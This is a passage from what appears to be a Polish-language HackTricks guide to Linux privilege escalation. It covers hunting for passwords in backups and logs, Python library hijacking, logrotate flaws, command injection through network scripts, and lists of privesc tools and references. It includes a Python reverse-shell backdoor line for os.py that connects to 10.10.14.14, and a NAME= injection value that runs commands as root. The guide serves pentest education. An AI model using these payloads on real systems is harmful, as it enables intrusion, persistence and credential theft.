find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Znane pliki zawierające hasła

Przeczytaj kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), który wyszukuje **kilka możliwych plików, które mogą zawierać hasła**.\
**Kolejnym interesującym narzędziem**, którego możesz do tego użyć, jest: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — aplikacja open source używana do odzyskiwania wielu haseł przechowywanych na lokalnym komputerze z systemem Windows, Linux lub Mac.

### Dzienniki

Jeśli możesz odczytywać dzienniki, możesz znaleźć **interesujące/poufne informacje w ich treści**. Im dziwniejszy jest dziennik, tym będzie prawdopodobnie bardziej interesujący.\
Ponadto niektóre nieprawidłowo skonfigurowane (poddane backdoorowaniu?) **dzienniki audytowe** mogą umożliwiać **zapisywanie haseł** w dziennikach audytowych, jak wyjaśniono w tym poście: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Aby **czytać logi, grupa** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) będzie bardzo pomocna.

### Pliki Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Wyszukiwanie generycznych credentials/regex

Należy również sprawdzać pliki zawierające słowo "**password**" w swojej **nazwie** lub wewnątrz **treści**, a także wyszukiwać adresy IP i adresy e-mail w logach oraz dopasowania do wyrażeń regularnych hashy.\
Nie będę tutaj wymieniać, jak to wszystko wykonać, ale jeśli Cię to interesuje, możesz sprawdzić ostatnie kontrole wykonywane przez [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Pliki z prawem zapisu

### Przejęcie biblioteki Python

Jeśli wiesz, **skąd** skrypt Python będzie uruchamiany i **możesz zapisywać w** tym folderze lub **modyfikować biblioteki Pythona**, możesz zmodyfikować bibliotekę systemową i dodać do niej backdoor (jeśli możesz zapisywać w miejscu, z którego skrypt Python będzie uruchamiany, skopiuj i wklej bibliotekę os.py).

Aby **dodać backdoor do biblioteki**, wystarczy dodać na końcu biblioteki os.py poniższą linię (zmień IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Eksploatacja logrotate

Luka w `logrotate` pozwala użytkownikom mającym **uprawnienia zapisu** do pliku logu lub jego katalogów nadrzędnych potencjalnie uzyskać podwyższone uprawnienia. Dzieje się tak, ponieważ `logrotate`, często uruchamiany jako **root**, może zostać wykorzystany do wykonywania dowolnych plików, szczególnie w katalogach takich jak _**/etc/bash_completion.d/**_. Należy sprawdzać uprawnienia nie tylko w _/var/log_, lecz także w każdym katalogu, w którym stosowana jest rotacja logów.

> [!TIP]
> Ta luka dotyczy wersji `logrotate` `3.18.0` i starszych

Więcej szczegółowych informacji o luce można znaleźć na tej stronie: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Możesz wykorzystać tę lukę za pomocą [**logrotten**](https://github.com/whotwagner/logrotten).

Ta luka jest bardzo podobna do [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logi nginx),** dlatego za każdym razem, gdy znajdziesz możliwość modyfikowania logów, sprawdź, kto zarządza tymi logami, oraz czy możesz eskalować uprawnienia, zastępując logi dowiązaniami symbolicznymi.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Odnośnik do luki:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Jeśli z dowolnego powodu użytkownik może **zapisać** skrypt `ifcf-<whatever>` w _/etc/sysconfig/network-scripts_ **lub** może **zmodyfikować** istniejący skrypt, oznacza to, że **system został przejęty**.

Skrypty sieciowe, na przykład _ifcg-eth0_, są używane do obsługi połączeń sieciowych. Wyglądają dokładnie jak pliki .INI. Jednak w systemie Linux są one \~wczytywane\~ przez Network Manager (dispatcher.d).

W moim przypadku atrybut `NAME=` w tych skryptach sieciowych nie jest poprawnie obsługiwany. Jeśli nazwa zawiera **spację/białe znaki, system próbuje wykonać część znajdującą się po spacji/białym znaku**. Oznacza to, że **wszystko po pierwszej spacji jest wykonywane jako root**.

Na przykład: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Zwróć uwagę na spację między Network a /bin/id_)

### **init, init.d, systemd, and rc.d**

Katalog `/etc/init.d` zawiera **scripts** dla System V init (SysVinit), **classic Linux service management system**. Zawiera skrypty do `start`, `stop`, `restart`, a czasami `reload` services. Można je wykonywać bezpośrednio lub za pośrednictwem symbolic links znajdujących się w `/etc/rc?.d/`. Alternatywną ścieżką w systemach Redhat jest `/etc/rc.d/init.d`.

Z kolei `/etc/init` jest powiązany z **Upstart**, nowszym **service management** wprowadzonym przez Ubuntu, wykorzystującym configuration files do zadań związanych z zarządzaniem services. Pomimo przejścia na Upstart, skrypty SysVinit są nadal używane wraz z konfiguracjami Upstart dzięki warstwie kompatybilności w Upstart.

**systemd** to nowoczesny initialization and service manager, oferujący zaawansowane funkcje, takie jak uruchamianie daemonów na żądanie, zarządzanie automount oraz snapshots stanu systemu. Porządkuje pliki w `/usr/lib/systemd/` dla distribution packages oraz w `/etc/systemd/system/` dla modyfikacji administratora, usprawniając proces system administration.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks często hookują syscall, aby udostępnić userspace managerowi uprzywilejowane funkcje kernela. Słabe uwierzytelnianie managera (np. signature checks oparte na FD-order lub słabe password schemes) może umożliwić lokalnej aplikacji podszycie się pod managera i eskalację do root na urządzeniach, które już mają root. Więcej informacji i szczegóły exploitation znajdziesz tutaj:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery w VMware Tools/Aria Operations może wyodrębnić binary path z command lines procesów i wykonać go z `-v` w uprzywilejowanym kontekście. Permissive patterns (np. wykorzystujące `\S`) mogą dopasować listeners przygotowane przez attackera w writable locations (np. `/tmp/httpd`), prowadząc do execution jako root (CWE-426 Untrusted Search Path).

Więcej informacji oraz generalized pattern, który można zastosować do innych discovery/monitoring stacks, znajdziesz tutaj:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(opcja -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../../banners/hacktricks-training.md}}
